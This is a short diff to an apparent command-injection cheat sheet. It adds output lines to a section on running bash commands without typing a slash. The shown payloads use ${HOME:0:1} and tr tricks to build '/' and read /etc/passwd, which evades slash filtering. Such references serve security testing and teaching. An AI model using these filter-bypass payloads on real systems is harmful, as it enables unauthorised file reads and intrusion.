@@ -145,12 +145,17 @@ Commands execution without backslash and slash - linux bash
 
 ```powershell
 swissky@crashlab▸ ~ ▸ $ echo ${HOME:0:1}
+/
 
 swissky@crashlab▸ ~ ▸ $ cat ${HOME:0:1}etc${HOME:0:1}passwd
 root:x:0:0:root:/root:/bin/bash
 
 swissky@crashlab▸ ~ ▸ $ echo . | tr '!-0' '"-1'
+/
+
 swissky@crashlab▸ ~ ▸ $ tr '!-0' '"-1' <<< .
+/
+
 swissky@crashlab▸ ~ ▸ $ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 root:x:0:0:root:/root:/bin/bash
 ```
